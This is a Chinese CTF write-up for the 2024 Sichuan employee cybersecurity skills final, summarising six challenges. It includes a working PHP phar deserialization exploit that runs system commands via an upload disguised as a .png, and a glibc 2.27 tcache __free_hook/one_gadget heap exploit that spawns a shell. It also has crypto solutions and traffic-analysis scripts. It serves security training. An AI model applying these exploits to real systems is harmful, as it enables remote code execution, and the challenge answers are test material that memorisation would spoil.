---
title: 四川省职工职业技能大赛网络安全决赛题解
contest: 四川省职工职业技能大赛网络安全决赛
year: 2024
difficulty: hard
vuln_type: misc_unknown
tags: [phar反序列化, AES-CBC, 楞伽经自定义S盒, AES密钥表置换, tcache double free, one_gadget 0x4f302, 流量分析, csv统计]
attack_chain:
  - 题1 phar.php: class A __destruct + class B __invoke + system($cmd)
  - $a->a = new B(); $b->cmd = "cat /flag"
  - Phar::setMetadata($a) + .phar 打包
  - upload.php 把 .phar 改 .png 上传 (uniqid().png)
  - file_get_contents($_GET['file']) + phar:// wrapper 触发
  - 题2 DASCTF 楞伽经: ruShiWoWen 表 256 字符, index ^ 64 得字节
  - KEY = DASCTF@Key@^_^@Encode!!Buddha!!!
  - IV = IV|DASCTF|OvO|IV
  - AES-CBC 解密
  - 题3 自定义 AES: 256 字节 Sbox 自实现, Rcon 标准
  - key = "Hi Android!0oO00" + table 置换 [0x0A,0x02,0x01,0x0D,...]
  - 32 字节密文解密
  - 题4 pwn_1 libc 2.27: add 9 个 + free 8 个 + show 泄 heap/libc
  - edit(3, p64(__free_hook)) + add(one_gadget 0x4f302) + free(0) → shell
  - 题5 流量分析: event_type_count 统计 + top_source_ip 提取
  - 题6 流量分析: IP 整数化 + 连接 (src+sport+dst+dport) + packet_size 累加
key_payload: 'phar 楞伽经 + 自定义 AES Sbox + tcache one_gadget 0x4f302 + 流量分析'
one_liner: 四川省职工决赛 6 题: phar 反序列化 + 楞伽经 AES + 自定义 Sbox AES + tcache one_gadget + 流量 csv 统计。
lesson: phar:// wrapper 是 PHP 文件上传配合反序列化的金钥匙; 楞伽经类题是自造字符表 (256 字符) 索引加密; tcache __free_hook + one_gadget 0x4f302 是 glibc 2.27 标准 UAF 利用。
quality: high
---

# 四川省职工职业技能大赛网络安全决赛题解

## 概览
- **来源**: ctfiot 197155
- **赛事**: 四川省职工职业技能大赛网络安全决赛
- **难度**: ⭐⭐⭐⭐

## 6 道题

### 题1: phar.php 反序列化
```php
class A { public $a; function __destruct() { $s = $this->a; $s(); } }
class B { public $cmd; function __construct() { $this->cmd = "cat flag"; }
         function __invoke() { return $this->start(); }
         function start() { system($this->cmd); } }
$b = new B(); $b->cmd = "cat /flag";
$a = new A(); $a->a = $b;
@unlink("phar.phar");
$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER();?>");
$phar->setMetadata($a);
$phar->addFromString("a.txt", "abb");
$phar->stopBuffering();
```
- upload.php 上传 .phar 改 .png (uniqid().png)
- file_get_contents($_GET['file']) + phar:// 触发反序列化

### 题2: DASCTF 楞伽经 AES
- 256 字符表 ruShiWoWen
- `index ^ 64` 得字节
- `KEY = b'DASCTF@Key@^_^@Encode!!Buddha!!!'`
- `IV = b'IV|DASCTF|OvO|IV'`
- AES-CBC 解密

### 题3: 自定义 AES (256 字节 Sbox)
```python
key = b"Hi Android!0oO00"
table = [0x0A, 0x02, 0x01, 0x0D, 0x0B, 0x09, 0x0E, 0x08, 0x07, 0x05, 0x00, 0x04, 0x0F, 0x03, 0x06, 0x0C]
key = bytes([key[i] for i in table])
cipher = AES(bytes_to_long(key))
flag = cipher.decrypt(enc[:16]) + cipher.decrypt(enc[16:])
```

### 题4: pwn_1 libc 2.27 tcache
```python
for i in range(9): add(b'a')
for i in range(8): free(i)
show()  # 泄 heap + libc
heap = leaked - 0xc50
libc.address = leaked - 0x3ebca0
edit(3, p64(libc.sym['__free_hook']))
add(p64(libc.address + 0x4f302))  # one_gadget
free(0)  # 触发 shell
```

### 题5-6: 流量分析
```python
# Q1: event_type 统计 + top source_ip
event_type_count = defaultdict(int)
for row in data: event_type_count[row['event_type']] += 1
# Q2: 连接 (src+sport+dst+dport) + packet_size 累加
result[connection] += sizes[i]
```

## 教学
- phar:// wrapper 触发反序列化是 PHP 经典 RCE
- 自造字符表 (256) 索引加密: ruShiWoWen 类型
- 自定义 AES Sbox: 256 字节查表, 密钥表置换
- libc 2.27 tcache: __free_hook + one_gadget 0x4f302 标准姿势
- 流量分析: defaultdict(int) + ipaddress.IPv4Address
